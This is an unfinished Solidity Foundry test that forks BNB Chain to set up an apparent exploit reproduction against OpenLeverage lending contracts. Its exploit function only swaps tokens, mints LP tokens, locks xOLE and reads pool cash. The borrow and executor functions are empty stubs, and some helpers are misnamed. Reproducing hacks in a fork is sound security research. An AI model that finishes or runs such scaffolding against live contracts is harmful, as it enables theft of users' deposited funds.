// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../../src/interface/interface.sol";

interface ITradeController {
    function activeTrades(
        address,
        uint16,
        bool
    )
        external
        view
        returns (
            uint256 deposited,
            uint256 held,
            bool depositToken,
            uint128 lastBlockNum
        );

    function getCash() external view returns (uint256);

    function markets(
        uint16
    )
        external
        view
        returns (
            address pool0,
            address pool1,
            address token0,
            address token1,
            uint16 marginLimit,
            uint16 feesRate,
            uint16 priceDiffientRatio,
            address priceUpdater,
            address pool0Insurance,
            address pool1Insurance
        );

    function payoffTrade(uint16 marketId, bool longToken) external payable;

    function marginTrade(
        uint16 marketId,
        bool longToken,
        bool depositToken,
        uint256 deposit,
        uint256 borrow,
        uint256 minBuyAmount,
        bytes memory dexData
    ) external payable returns (uint256);
}

interface ILToken is ICErc20Delegate {
    function availableForBorrow() external view returns (uint256);
}

interface IxOLE is IERC20 {
    function create_lock(uint256 _value, uint256 _unlock_time) external;
}

interface IOPBorrowingDelegator {
    function borrow(
        uint16 marketId,
        bool collateralIndex,
        uint256 collateral,
        uint256 borrowing
    ) external payable;

    function liquidate(
        uint16 marketId,
        bool collateralIndex,
        address borrower
    ) external;
}

contract ContractTest is Test {
    struct SwapDescription {
        address srcToken;
        address dstToken;
        address srcReceiver;
        address dstReceiver;
        uint256 amount;
        uint256 minReturnAmount;
        uint256 flags;
    }
    IERC20 private constant ETH =
        IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IERC20 private constant USDC =
        IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 private constant BTCB =
        IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 private constant BUSDT =
        IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant WBNB =
        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant OLE =
        IERC20(0xB7E2713CF55cf4b469B5a8421Ae6Fc0ED18F1467);
    IxOLE private constant xOLE =
        IxOLE(0x71F1158D76aF5B6762D5EbCdEE19105eab2C77d2);
    ILToken private constant LToken =
        ILToken(payable(0x7c5e04894410e98b1788fbdB181FfACbf8e60617));
    Uni_Pair_V2 private constant USDC_OLE =
        Uni_Pair_V2(0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4);
    Uni_Router_V2 private constant Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ITradeController private constant TradeController =
        ITradeController(0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4);
    IOPBorrowingDelegator private constant OPBorrowingDelegator =
        IOPBorrowingDelegator(0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47);
    uint16 private constant marketId = 24;

    function setUp() public {
        vm.createSelectFork("bsc", 37_470_328);
        vm.label(address(ETH), "ETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(BTCB), "BTCB");
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(OLE), "OLE");
        vm.label(address(xOLE), "xOLE");
        vm.label(address(USDC_OLE), "USDC_OLE");
        vm.label(address(Router), "Router");
        vm.label(address(TradeController), "TradeController");
        vm.label(address(OPBorrowingDelegator), "OPBorrowingDelegator");
    }

    receive() external payable {}

    function testExploit() public {
        deal(address(this), 5 ether);
        console2.log(
            "Bnb before: ",
            address(this).balance,
            USDC_OLE.balanceOf(address(this)),
            USDC.balanceOf(address(this))
            //OLE.balanceOf(address(this))
        );
        // add lp to pair

        WBNBToUSDC();
        WBNBToOLE();
        console2.log(
            "Bnb before1: ",
            USDC.balanceOf(address(this)),
            OLE.balanceOf(address(this))
        );
        USDC.transfer(address(USDC_OLE), USDC.balanceOf(address(this)));
        OLE.transfer(address(USDC_OLE), OLE.balanceOf(address(this)));
        console2.log(
            "Bnb before2: ",
            USDC_OLE.balanceOf(address(this)),
            USDC.balanceOf(address(this)),
            OLE.balanceOf(address(this))
        );
        USDC_OLE.mint(address(this));
        console2.log("Bnb before: ", USDC_OLE.balanceOf(address(this)));

        USDC_OLE.approve(address(xOLE), USDC_OLE.balanceOf(address(this)));
        xOLE.create_lock(1, block.timestamp + 1814400);
        (
            ,
            ,
            ,
            ,
            uint16 marginLimit,
            uint16 feesRate,
            uint16 priceDiffientRatio,
            ,
            ,

        ) = TradeController.markets(marketId);
        uint256 underlyingWBNBBal = LToken.getCash();
        
    }

    function borrow() external {}

    function WBNBToOLE() private {
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(OLE);
        USDC.approve(address(Router), type(uint256).max);
        Router.swapTokensForExactTokens(
            100,
            100,
            path,
            address(this),
            block.timestamp
        );
    }

    function WBNBToUSDC() private {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDC);
        Router.swapETHForExactTokens{value: 0.01 ether}(
            100,
            path,
            address(this),
            block.timestamp
        );
    }

    function WBNBToUSDT() private {}

    function BUSDTToWBNB() private {}
}

contract Executor {
    IERC20 private constant WBNB =
        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant BUSDT =
        IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Router_V2 private constant Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function execute(address _sender) external {
        console2.log("execute:");
    }
}
